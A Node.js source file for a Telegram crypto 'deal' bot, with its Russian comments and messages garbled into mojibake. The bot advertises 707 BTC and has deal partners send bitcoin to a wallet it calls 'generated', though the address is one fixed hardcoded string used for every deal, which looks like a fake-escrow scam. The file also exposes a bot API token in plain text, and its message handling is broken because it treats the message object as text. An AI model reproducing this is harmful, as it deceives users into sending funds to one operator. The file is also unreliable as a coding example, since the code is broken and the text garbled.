const TelegramBot = require('node-telegram-bot-api');
const uuidv4 = require('uuid');

// –¢–æ–∫–µ–Ω –±–æ—Ç–∞
const token = '6146320655:AAGq_TSNJuKyc8PpvXHy-VxiYREcYRJe7OI';

// –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö BTC
const availableBTC = 707;

// –û–±—ä–µ–∫—Ç –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è—Ö –∏ —Å–¥–µ–ª–∫–∞—Ö
const users = {};

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∫–Ω–æ–ø–æ–∫ inline –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
const inlineKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: '‚öôÔ∏è–°–æ–∑–¥–∞—Ç—å –Ω–æ–≤—É—é —Å–¥–µ–ª–∫—É', callback_data: 'createDeal' }],
      [{ text: 'üç•–ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª', url: 'https://t.me/cryptobotanika' }]
    ]
  }
};

// –°–æ–∑–¥–∞–µ–º –±–æ—Ç–∞
const bot = new TelegramBot(token, { polling: true });

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
  users[userId] = {
    id: userId,
    balance: 0,
    deals: {}
  };

  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –¥–æ—Å—Ç—É–ø–Ω—ã–º–∏ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–∞–º–∏ –∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π
  bot.sendMessage(chatId, `üí≥–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ CRYPTO BOT\n–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—ã:\nBTC ${availableBTC}\n‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n–ü–†–ò –ü–û–ü–û–õ–ù–ï–ù–ò–ò –ë–ê–õ–ê–ù–°–ê –ù–ï –ó–ê–ë–´–í–ê–ô–¢–ï –£–ö–ê–ó–´–í–ê–¢–¨ –í–ê–® UserID`, inlineKeyboard);
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /sdelka
bot.onText(/\/sdelka/, (msg) => {
  const chatId = msg.chat.id;

  // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–¥–µ–ª–∫–∏
  const dealId = uuidv4();

  // –î–æ–±–∞–≤–ª—è–µ–º —Å–¥–µ–ª–∫—É –≤ –æ–±—ä–µ–∫—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
  const userId = msg.from.id;
  users[userId].deals[dealId] = {
    id: dealId,
    partnerId: null,
    amount: null,
    wallet: null
  };

  // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è —Å —Å—Å—ã–ª–∫–æ–π –Ω–∞ —Å–¥–µ–ª–∫—É
  const dealLink = `https://t.me/${bot.options.username}?start=deal_${dealId}`;
  const dealMessage = `–í—ã —Å–æ–∑–¥–∞–ª–∏ –Ω–æ–≤—É—é —Å–¥–µ–ª–∫—É! –û—Ç–ø—Ä–∞–≤—å—Ç–µ —ç—Ç—É —Å—Å—ã–ª–∫—É –ø–∞—Ä—Ç–Ω–µ—Ä—É –ø–æ —Å–¥–µ–ª–∫–µ: ${dealLink}`;

  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Å—Å—ã–ª–∫–æ–π –Ω–∞ —Å–¥–µ–ª–∫—É
  bot.sendMessage(chatId, dealMessage);
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–æ–∫ inline –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const userId = query.from.id;
  const data = query.data;

  // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–∫–∏ "–°–æ–∑–¥–∞—Ç—å –Ω–æ–≤—É—é —Å–¥–µ–ª–∫—É"
  if (data === 'createDeal') {
    // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–¥–µ–ª–∫–∏
    const dealId = uuidv4();

    // –î–æ–±–∞–≤–ª—è–µ–º —Å–¥–µ–ª–∫—É –≤ –æ–±—ä–µ–∫—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    users[userId].deals[dealId] = {
      id: dealId,
      partnerId: null,
      amount: null,
      wallet: null
    };

    // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è —Å —Å—Å—ã–ª–∫–æ–π –Ω–∞ —Å–¥–µ–ª–∫—É
    const dealLink = `https://t.me/${bot.options.username}?start=deal_${dealId}`;
    const dealMessage = `–í—ã —Å–æ–∑–¥–∞–ª–∏ –Ω–æ–≤—É—é —Å–¥–µ–ª–∫—É! –û—Ç–ø—Ä–∞–≤—å—Ç–µ —ç—Ç—É —Å—Å—ã–ª–∫—É –ø–∞—Ä—Ç–Ω–µ—Ä—É –ø–æ —Å–¥–µ–ª–∫–µ: ${dealLink}`;

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Å—Å—ã–ª–∫–æ–π –Ω–∞ —Å–¥–µ–ª–∫—É
    bot.sendMessage(chatId, dealMessage);
  }
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–µ—Ä–µ—Ö–æ–¥–∞ –ø–æ —Å—Å—ã–ª–∫–µ –Ω–∞ —Å–¥–µ–ª–∫—É
bot.on('message', (msg) => {
  // –ò–∑–≤–ª–µ–∫–∞–µ–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–¥–µ–ª–∫–∏ –∏–∑ —Å—Å—ã–ª–∫–∏
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg;
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å—Å—ã–ª–∫–æ–π –Ω–∞ —Å–¥–µ–ª–∫—É
  if (text && text.startsWith('https://t.me/' + bot.options.username + '?start=deal_')) {
    const dealId = text.split('deal_')[1];

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ —Å–¥–µ–ª–∫–∞ —Å —Ç–∞–∫–∏–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º
    if (users[userId].deals[dealId]) {
      const deal = users[userId].deals[dealId];

      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–∞—Ä—Ç–Ω–µ—Ä–æ–º –ø–æ —Å–¥–µ–ª–∫–µ
      if (!deal.partnerId) {
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø–∞—Ä—Ç–Ω–µ—Ä–∞ –ø–æ —Å–¥–µ–ª–∫–µ
        deal.partnerId = userId;

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∑–∞–ø—Ä–æ—Å–æ–º —Å—É–º–º—ã —Å–¥–µ–ª–∫–∏
        const message = `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${msg.from.username} —Å–æ–≥–ª–∞—Å–∏–ª—Å—è —Å –≤–∞–º–∏ –Ω–∞ —Å–¥–µ–ª–∫—É, –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏:`;
        bot.sendMessage(chatId, message);
      } else {
        // –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –±—ã–ª –¥–æ–±–∞–≤–ª–µ–Ω –∫–∞–∫ –ø–∞—Ä—Ç–Ω–µ—Ä –ø–æ —Å–¥–µ–ª–∫–µ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
        bot.sendMessage(chatId, '–ü–æ –¥–∞–Ω–Ω–æ–π —Å—Å—ã–ª–∫–µ —Å–¥–µ–ª–∫–∞ —É–∂–µ —Å–æ–∑–¥–∞–Ω–∞');
      }
    } else {
      // –ï—Å–ª–∏ —Å–¥–µ–ª–∫–∞ —Å —Ç–∞–∫–∏–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º –Ω–µ –Ω–∞–π–¥–µ–Ω–∞, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
      bot.sendMessage(chatId, '–î–∞–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–∞');
    }
  } else {
    // –ï—Å–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Å—Å—ã–ª–∫–æ–π –Ω–∞ —Å–¥–µ–ª–∫—É, –ø—Ä–æ–≤–µ—Ä—è–µ–º, –æ–∂–∏–¥–∞–µ—Ç—Å—è –ª–∏ –≤–≤–æ–¥ —Å—É–º–º—ã —Å–¥–µ–ª–∫–∏
    const deal = Object.values(users[userId].deals).find((deal) => deal.partnerId === userId && deal.amount === null);

    if (deal) {
      const amount = parseFloat(text);

      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –≤–≤–µ–¥–µ–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —á–∏—Å–ª–æ–º –∏ –Ω–µ –ø—Ä–µ–≤—ã—à–∞–µ—Ç –ª–∏ –æ–Ω–æ –¥–æ—Å—Ç—É–ø–Ω—É—é —Å—É–º–º—É BTC
      if (isNaN(amount) || amount <= 0 || amount > availableBTC) {
        bot.sendMessage(chatId, `–°—É–º–º–∞ —Å–¥–µ–ª–∫–∏ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —á–∏—Å–ª–æ–º, –±–æ–ª—å—à–µ 0 –∏ –Ω–µ –ø—Ä–µ–≤—ã—à–∞—Ç—å ${availableBTC} BTC`);
      } else {
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å—É–º–º—É —Å–¥–µ–ª–∫–∏
        deal.amount = amount;

        // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫—Ä–∏–ø—Ç–æ-–∫–æ—à–µ–ª–µ–∫ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ
        const wallet = `bc1qf0ghldtatq5727zz7cvrrjsnaxdat5cn9yuxnz`;
        deal.wallet = wallet;

        // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –ø–æ –æ–ø–ª–∞—Ç–µ
        const message = `–û—Ç–ª–∏—á–Ω–æ, —Ç–µ–ø–µ—Ä—å –æ—Å—Ç–∞–ª–æ—Å—å –ø–æ–ø–æ–ª–Ω–∏—Ç—å —ç—Ç—É —Å—É–º–º—É –ø–æ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–º—É –∫—Ä–∏–ø—Ç–æ-–∫–æ—à–µ–ª—å–∫—É\n\n–í–∞—à —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫—Ä–∏–ø—Ç–æ –∫–æ—à–µ–ª–µ–∫: ${wallet}, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–∞ –Ω–µ–≥–æ ${amount} BTC`;

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –ø–æ –æ–ø–ª–∞—Ç–µ
        bot.sendMessage(chatId, message);
      }
    }
  }
});